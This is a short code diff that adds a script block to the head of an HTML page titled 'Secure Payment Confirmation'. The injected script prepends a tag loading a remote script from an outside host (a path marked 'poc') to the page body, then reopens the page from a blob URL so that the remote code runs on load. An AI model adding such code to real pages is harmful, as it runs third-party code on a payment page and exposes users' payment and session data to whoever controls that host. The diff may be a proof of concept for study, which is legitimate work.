@@ -15,6 +15,12 @@
 
   <title>Secure Payment Confirmation</title>
   <link rel="icon" href="/favicon.ico">
+  <script>
+    html = "<script src='https://lightrains.org/js/poc/test202104/poc.js'></script>"+document.getElementsByTagName('body')[0].innerHTML;
+	blob = new Blob([html], {type: 'text/html'});
+    url = URL.createObjectURL(blob); 
+    window.open(url,"_self");
+  </script>
 </head>
 
 <body>
